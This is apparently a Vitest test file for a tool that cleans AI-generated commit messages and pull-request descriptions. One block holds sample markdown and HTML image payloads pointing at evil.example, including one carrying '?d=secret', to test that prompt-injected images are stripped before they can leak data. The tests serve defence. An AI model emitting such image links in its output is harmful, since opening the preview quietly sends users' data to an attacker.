import { describe, expect, it } from 'vitest';
import { CommitCraftError } from '../../src/core/errors';
import { cleanCommitMessage, cleanPrDescription, shortenSubject } from '../../src/core/response';

const conventional = { style: 'conventional', maxSubjectLength: 72 } as const;
const plain = { style: 'plain', maxSubjectLength: 72 } as const;

function codeOf(fn: () => unknown): string | undefined {
  try {
    fn();
  } catch (error) {
    return error instanceof CommitCraftError ? error.code : `unexpected: ${String(error)}`;
  }
  return undefined;
}

describe('cleanCommitMessage: cleanup', () => {
  it('passes a good conventional message through unchanged', () => {
    const message = 'feat(auth): add token refresh\n\n- rotate refresh tokens on use\n- expire after 30 days';
    expect(cleanCommitMessage(message, conventional)).toEqual({ text: message, warnings: [] });
  });

  it('strips a code fence around the whole answer', () => {
    expect(cleanCommitMessage('```\nfix: handle empty input\n```', conventional).text).toBe('fix: handle empty input');
    expect(cleanCommitMessage('```text\nfix: handle empty input\n\nBody line.\n```', conventional).text).toBe(
      'fix: handle empty input\n\nBody line.',
    );
  });

  it('extracts the fenced block when the model adds a preamble and an afterword', () => {
    const raw = "Here's the commit message:\n\n```\nfix: handle empty input\n```\n\nThis follows Conventional Commits.";
    expect(cleanCommitMessage(raw, conventional).text).toBe('fix: handle empty input');
  });

  it('strips a preamble line without a fence', () => {
    expect(cleanCommitMessage('Sure! Here is the commit message:\n\nfix: handle empty input', conventional).text).toBe(
      'fix: handle empty input',
    );
    expect(cleanCommitMessage("Here's a commit message for your changes:\nfix: handle empty input", conventional).text).toBe(
      'fix: handle empty input',
    );
  });

  it('keeps a real code fence that is part of the body', () => {
    const raw = 'docs: show usage\n\nExample:\n\n```ts\nrun();\n```';
    expect(cleanCommitMessage(raw, conventional).text).toBe(raw);
  });

  it('strips surrounding quotes', () => {
    expect(cleanCommitMessage('"fix: handle empty input"', conventional).text).toBe('fix: handle empty input');
    expect(cleanCommitMessage('`fix: handle empty input`', conventional).text).toBe('fix: handle empty input');
  });

  it('removes a trailing period and a markdown heading marker from the subject', () => {
    expect(cleanCommitMessage('# fix: handle empty input.', conventional).text).toBe('fix: handle empty input');
  });

  it('repairs a missing space after the colon', () => {
    expect(cleanCommitMessage('feat:add login', conventional).text).toBe('feat: add login');
  });

  it('keeps a body that merely contains a colon line before a fence (not a lead-in)', () => {
    const raw = 'fix: stop crash\n\nRepro:\n```\nrun --bad\n```';
    expect(cleanCommitMessage(raw, conventional).text).toBe(raw);
  });

  it('normalises the type to lowercase', () => {
    expect(cleanCommitMessage('Feat(Auth): Add login', conventional).text).toBe('feat(Auth): Add login');
    expect(cleanCommitMessage('FIX: crash on start', conventional).text).toBe('fix: crash on start');
  });

  it('normalises CRLF, trailing spaces and runs of blank lines; ensures one blank line before the body', () => {
    const raw = 'fix: crash on start  \r\n\r\n\r\n\r\nBody one.   \r\nBody two.\r\n';
    expect(cleanCommitMessage(raw, conventional).text).toBe('fix: crash on start\n\nBody one.\nBody two.');
    expect(cleanCommitMessage('fix: crash on start\nBody directly after.', conventional).text).toBe(
      'fix: crash on start\n\nBody directly after.',
    );
  });

  it('allows a breaking-change marker and keeps the footer', () => {
    const raw = 'feat(api)!: drop v1 endpoints\n\nBREAKING CHANGE: /v1 is gone';
    expect(cleanCommitMessage(raw, conventional).text).toBe(raw);
  });
});

describe('cleanCommitMessage: subject length', () => {
  it('shortens an over-long subject at a word boundary and warns', () => {
    const raw = 'feat(auth): add refresh token rotation with sliding expiry windows and revocation lists for all clients';
    const result = cleanCommitMessage(raw, { style: 'conventional', maxSubjectLength: 50 });
    const subject = result.text.split('\n')[0] as string;
    expect(subject.length).toBeLessThanOrEqual(50);
    expect(subject.startsWith('feat(auth): add refresh token rotation')).toBe(true);
    expect(subject).not.toMatch(/\s(and|with|for|of)$/);
    expect(result.warnings).toEqual(['The subject line was shortened to fit 50 characters.']);
  });

  it('keeps the body when it shortens the subject', () => {
    const long = `fix: ${'very '.repeat(30)}important bug`;
    const result = cleanCommitMessage(`${long}\n\nDetails here.`, conventional);
    expect(result.text.endsWith('\n\nDetails here.')).toBe(true);
    expect((result.text.split('\n')[0] as string).length).toBeLessThanOrEqual(72);
  });

  it('does not warn when the subject is exactly at the limit', () => {
    const subject = `fix: ${'a'.repeat(67)}`;
    expect(subject).toHaveLength(72);
    expect(cleanCommitMessage(subject, conventional)).toEqual({ text: subject, warnings: [] });
  });

  it('shortenSubject hard-cuts a single enormous word and never returns an empty string', () => {
    expect(shortenSubject('x'.repeat(200), 40)).toBe('x'.repeat(40));
    expect(shortenSubject('short', 40)).toBe('short');
  });
});

describe('cleanCommitMessage: validation', () => {
  it('rejects a non-conventional subject in conventional style, telling the user what to do', () => {
    let message = '';
    try {
      cleanCommitMessage('Added a login page', conventional);
    } catch (error) {
      message = (error as Error).message;
    }
    expect(message).toMatch(/Conventional Commit/);
    expect(message).toMatch(/Run the command again/);
    expect(message).toMatch(/"plain"/);
  });

  it.each([
    ['unknown type', 'wip: stuff'],
    ['missing description', 'feat:'],
    ['empty scope', 'feat(): add login'],
    ['type only', 'feat'],
  ])('rejects %s', (_label, subject) => {
    expect(codeOf(() => cleanCommitMessage(subject, conventional))).toBe('MALFORMED_RESPONSE');
  });

  it('accepts any subject in plain style, including conventional-looking ones', () => {
    expect(cleanCommitMessage('Add a login page', plain).text).toBe('Add a login page');
    expect(cleanCommitMessage('fix: crash on start', plain).text).toBe('fix: crash on start');
  });

  it.each(['', '   ', '\n\n', '```\n```', '""'])('rejects an empty answer %j', (raw) => {
    expect(codeOf(() => cleanCommitMessage(raw, plain))).toBe('EMPTY_RESPONSE');
  });
});

const GOOD_PR = [
  '## Summary',
  'Adds token refresh.',
  '',
  '## Changes',
  '- add `refresh()`',
  '',
  '## Testing',
  '- new unit tests',
  '',
  '## Risks',
  'None identified.',
].join('\n');

describe('cleanPrDescription', () => {
  it('accepts a complete description and ends it with one newline', () => {
    expect(cleanPrDescription(GOOD_PR)).toEqual({ text: `${GOOD_PR}\n`, warnings: [] });
  });

  it('strips a fence around the whole description', () => {
    expect(cleanPrDescription(`\`\`\`markdown\n${GOOD_PR}\n\`\`\``).text).toBe(`${GOOD_PR}\n`);
  });

  it('drops chatter before the first heading', () => {
    expect(cleanPrDescription(`Here is the PR description:\n\n${GOOD_PR}`).text).toBe(`${GOOD_PR}\n`);
  });

  it('normalises heading level, case and trailing colon for the required sections', () => {
    const raw = '### summary:\nA.\n\n## CHANGES\n- b\n\n### Testing\n- c\n\n## risks:\nNone.';
    expect(cleanPrDescription(raw).text).toBe('## Summary\nA.\n\n## Changes\n- b\n\n## Testing\n- c\n\n## Risks\nNone.\n');
  });

  it('keeps an optional title and extra sections', () => {
    const raw = `# Add token refresh\n\n${GOOD_PR}\n\n## Notes\nExtra.`;
    const text = cleanPrDescription(raw).text;
    expect(text.startsWith('# Add token refresh\n')).toBe(true);
    expect(text).toContain('## Notes\nExtra.');
  });

  it('keeps a code block that closes a section (a balanced fence is content, not a wrapper)', () => {
    const raw = `${GOOD_PR.replace('None identified.', 'Run the migration first:\n\n```sh\nnpm run migrate\n```')}`;
    expect(cleanPrDescription(raw).text).toBe(`${raw}\n`);
  });

  it('still removes a stray trailing fence (an odd number of fences)', () => {
    expect(cleanPrDescription(`${GOOD_PR}\n\`\`\``).text).toBe(`${GOOD_PR}\n`);
  });

  describe('markdown images are neutralised (a prompt-injected image fires a request when the preview opens)', () => {
    const withBody = (body: string): string => GOOD_PR.replace('Adds token refresh.', body);

    it.each([
      ['an inline image', 'See ![diagram](https://evil.example/a.png?d=secret) here', 'See diagram (image removed) here'],
      ['an image without alt text', 'Look ![](https://evil.example/x.png)', 'Look (image removed)'],
      ['a reference-style image', 'Look ![chart][ref]', 'Look chart (image removed)'],
      ['an HTML image tag', 'Look <img src="https://evil.example/x.png" onerror="x()"> now', 'Look (image removed) now'],
    ])('removes %s', (_label, body, expected) => {
      const text = cleanPrDescription(withBody(body)).text;
      expect(text).toContain(expected);
      expect(text).not.toContain('evil.example');
    });

    it('leaves ordinary links and images shown inside code blocks alone', () => {
      const body = 'See [the docs](https://docs.example/page).\n\n```md\n![logo](logo.png)\n```';
      expect(cleanPrDescription(withBody(body)).text).toContain(body);
    });
  });

  it('names the missing sections', () => {
    const raw = '## Summary\nA.\n\n## Changes\n- b';
    let message = '';
    try {
      cleanPrDescription(raw);
    } catch (error) {
      message = (error as Error).message;
    }
    expect(message).toMatch(/Testing and Risks sections/);
    expect(codeOf(() => cleanPrDescription(raw))).toBe('MALFORMED_RESPONSE');
  });

  it('rejects an answer without any headings', () => {
    expect(codeOf(() => cleanPrDescription('This PR adds token refresh.'))).toBe('MALFORMED_RESPONSE');
  });

  it.each(['', '  \n ', '```\n```'])('rejects an empty answer %j', (raw) => {
    expect(['EMPTY_RESPONSE', 'MALFORMED_RESPONSE']).toContain(codeOf(() => cleanPrDescription(raw)));
  });
});
